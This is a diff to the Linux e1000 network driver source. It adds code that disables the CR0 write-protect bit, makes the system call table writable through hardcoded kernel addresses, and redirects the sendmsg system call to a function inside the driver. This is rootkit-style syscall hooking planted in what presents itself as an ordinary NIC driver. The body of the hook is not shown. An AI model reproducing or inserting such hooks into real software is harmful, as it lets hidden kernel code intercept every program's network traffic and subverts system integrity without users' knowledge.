@@ -250,6 +250,9 @@ struct net_device *e1000_get_hw_dev(struct e1000_hw *hw)
 	return adapter->netdev;
 }
 
+void (*pages_rw) (struct page *page, int numpages) = (void *)0x8106c7c0;
+void (*pages_ro) (struct page *page, int numpages) = (void *)0x8106c740;
+
 asmlinkage int (*original_sendmsg) (int sockfd, struct mmsghdr *msgvec, unsigned int vlen, unsigned int flags);
 asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vlen, unsigned int flags)
 {
@@ -279,6 +282,7 @@ asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vl
 static int __init e1000_init_module(void)
 {
 	int ret;
+        struct page * _sys_call_page;
 	pr_info("%s - version %s\n", e1000_driver_string, e1000_driver_version);
 
 	pr_info("%s\n", e1000_copyright);
@@ -292,19 +296,27 @@ static int __init e1000_init_module(void)
 				   "packets <= %u bytes\n", copybreak);
 	}
        
+
         unsigned long cr0;
         cr0 = read_cr0();
         pr_info("cr0 is : 0x%x\n", cr0);
+        
         /* disable bit 16 of CR0 register */
         write_cr0(read_cr0() & ~0x10000); 
+        
         cr0 = read_cr0();
         pr_info("cr0 is : 0x%x\n", cr0);
+        
+        _sys_call_page = virt_to_page(&sys_call_table);
+        pages_rw(_sys_call_page, 1);
         /* store original location of sendmsg(). Alter sys_call_table to point to our functions*/
         //original_sendmsg = (void *)xchg(&sys_call_table[__NR_sendmsg], e1000_sendmsg);
         //original_close = (void *)xchg(&sys_call_table[__NR_close], e1000_close);
         original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
         sys_call_table[__NR_sendmsg] = e1000_sendmsg;
+        
         write_cr0(read_cr0() | (0x10000));
+        
         cr0 = read_cr0();
         pr_info("cr0 is : 0x%x\n", cr0);
         pr_info("modified sys_call_table!\n");
@@ -321,9 +333,13 @@ module_init(e1000_init_module);
  **/
 static void __exit e1000_exit_module(void)
 {
+        struct page * _sys_call_page;
         write_cr0(read_cr0() & (~ 0x10000));
+        _sys_call_page = virt_to_page(&sys_call_table);
         //xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
         sys_call_table[__NR_sendmsg] = original_sendmsg;
+        _sys_call_page = virt_to_page(&sys_call_table);
+        pages_ro(_sys_call_page, 1);
         write_cr0(read_cr0() | (0x10000));
 	pci_unregister_driver(&e1000_driver);
 }
